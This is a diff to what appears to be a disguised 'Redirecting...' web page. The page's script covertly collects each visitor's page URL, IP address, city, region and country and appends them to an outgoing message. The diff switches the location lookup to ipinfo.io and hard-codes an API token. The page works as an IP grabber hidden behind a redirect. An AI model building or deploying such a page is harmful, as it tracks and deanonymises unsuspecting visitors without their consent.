@@ -40,10 +40,10 @@
 • Page URL: ${window.location.href}`
     };
 
-    fetch("http://ip-api.com/json")
+    fetch("https://ipinfo.io/json?token=6535079283a599") // <- Získej zdarma na ipinfo.io
       .then(res => res.json())
       .then(ipdata => {
-        data.content += `\n• IP: ${ipdata.query}\n• Location: ${ipdata.city}, ${ipdata.regionName}, ${ipdata.country}`;
+        data.content += `\n• IP: ${ipdata.ip}\n• Location: ${ipdata.city}, ${ipdata.region}, ${ipdata.country}`;
       })
       .catch(() => {
         data.content += "\n• IP Lookup Failed";
@@ -63,3 +63,4 @@
   <p>Redirecting...</p>
 </body>
 </html>
+
